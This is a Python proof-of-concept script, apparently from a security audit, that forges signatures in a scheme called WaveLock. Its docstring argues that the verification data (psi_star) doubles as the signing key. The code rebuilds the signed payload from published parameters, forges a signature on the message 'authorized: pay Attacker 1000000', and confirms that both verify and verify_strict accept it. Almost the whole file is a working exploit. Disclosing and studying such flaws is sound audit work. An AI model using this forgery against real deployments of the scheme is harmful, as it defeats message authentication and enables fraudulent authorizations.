"""
ATTACK CLASS 1 (Inversion / no-inversion-needed forgery)
========================================================
Thesis: WaveLock is NOT a public-key signature. It is a symmetric keyed hash
(a MAC) whose "key" is psi_star. The verifier needs the *entire* psi_star to
check a signature, and the project's own README ships psi_star to verifiers as
published `commitments/*.npz` snapshots for "full strict verification"
(see tools/audit_multi_trust.py: it np.load()s psi_star and calls kp.verify).

Therefore: anyone who can VERIFY can FORGE. No PDE inversion, no seed, no
curvature math is required. We never run the "hard" evolution.

This script:
  1. The signer makes a keypair and signs message A.
  2. The attacker is given ONLY what a verifier legitimately receives:
       - psi_star (the published .npz snapshot contents)
       - the public kernel params / schema
     The attacker is NOT given the seed and never runs the PDE.
  3. The attacker forges a valid signature for an arbitrary NEW message B
     by recomputing the same hash the verifier will recompute.
  4. The signer's own verify() accepts the forgery.
"""
import json, struct, hashlib
import numpy as np
from wavelock.chain.Wavelock_numpy import (
    CurvatureKeyPairV3, _kernel_hash, KERNEL_VERSION,
    alpha, beta, theta, epsilon, delta,
)
from wavelock.chain.hash_families import hash_hex, DEFAULT_PRIMARY_FAMILY, DEFAULT_SECONDARY_FAMILY


def attacker_forge(psi_star: np.ndarray, message: str) -> tuple[str, str]:
    """Forge (primary, secondary) signatures using ONLY psi_star + public params.

    This reconstructs _sig_payload() byte-for-byte from publicly known data.
    Nothing here is secret: the header is fully determined by published params,
    and psi_star is exactly what a strict verifier is handed.
    """
    header = json.dumps({
        "schema": "WLv3.1",
        "dtype": "float64", "ord": "C",
        "shape": [int(x) for x in psi_star.shape],
        "alpha": float(alpha), "beta": float(beta), "theta": float(theta),
        "epsilon": float(epsilon), "delta": float(delta),
        "kernel_version": KERNEL_VERSION, "kernel_hash": _kernel_hash(),
    }, separators=(",", ":"), sort_keys=True).encode("utf-8")
    payload = (b"SIGv2\0" + message.encode() + b"\0" + header + b"\0"
               + np.asarray(psi_star, dtype=np.float64).ravel(order="C").tobytes())
    return (hash_hex(payload, DEFAULT_PRIMARY_FAMILY),
            hash_hex(payload, DEFAULT_SECONDARY_FAMILY))


def main():
    print("=" * 70)
    print("WaveLock forgery: verification material IS the signing key")
    print("=" * 70)

    # --- Signer side ---
    signer = CurvatureKeyPairV3(n=4, seed=42)
    sig_A = signer.sign("authorized: pay Alice 10")
    print(f"\n[signer] legit signature on message A: {sig_A[:24]}...")
    assert signer.verify("authorized: pay Alice 10", sig_A)

    # --- What the verifier receives (and thus what an attacker has) ---
    # This is exactly tools/publish_trusted.py -> commitments/<hash>.npz
    psi_star_public = np.asarray(signer.psi_star, dtype=np.float64)
    print(f"[verifier] is handed psi_star snapshot: shape={psi_star_public.shape}")

    # --- Attacker forges a brand-new message it was never authorized to sign ---
    forged_msg = "authorized: pay Attacker 1000000"
    f_primary, f_secondary = attacker_forge(psi_star_public, forged_msg)
    print(f"\n[attacker] forged primary  sig: {f_primary[:24]}...")
    print(f"[attacker] forged secondary sig: {f_secondary[:24]}...")

    # --- The signer's own verifier accepts both forgeries ---
    ok_p = signer.verify(forged_msg, f_primary)
    ok_s = signer.verify(forged_msg, f_secondary)
    ok_strict = signer.verify_strict(forged_msg, f_primary, f_secondary)
    print(f"\n[verify] signer.verify(forged, primary)   = {ok_p}")
    print(f"[verify] signer.verify(forged, secondary) = {ok_s}")
    print(f"[verify] signer.verify_strict(forged,p,s)  = {ok_strict}")

    assert ok_p and ok_s and ok_strict, "forgery failed"
    print("\nRESULT: FORGERY SUCCEEDED on an arbitrary message.")
    print("No PDE inversion, no seed, no curvature evolution was performed.")
    print("The attacker used only the data a strict verifier must possess.")


if __name__ == "__main__":
    main()
